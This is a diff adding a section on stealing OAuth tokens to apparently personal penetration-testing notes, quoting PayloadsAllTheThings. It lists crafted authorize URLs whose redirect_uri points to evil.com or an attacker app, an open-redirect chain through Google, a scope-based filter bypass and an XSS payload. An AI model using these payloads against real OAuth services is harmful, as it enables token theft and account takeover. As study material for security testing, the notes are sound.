@@ -511,7 +511,35 @@ Host: oauth-authorization-server.com
 
 * from there one may have several options: register rogue endpoint, ...
 
-#### Register rogue endpoint
+### Steal OAuth token via referrer
+
+Source `https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/#stealing-oauth-token-via-referer`
+
+```bash
+
+# simple malicious redirect
+
+https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
+
+https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
+
+# Redirect to an accepted Open URL like google to get the access token 
+
+https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
+
+https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
+
+
+# the scope to bypass a filter on redirect_uri:
+
+https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
+Executing XSS via redirect_uri
+
+https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
+
+```
+
+### Register rogue endpoint
 
 ## OpenID connect
 
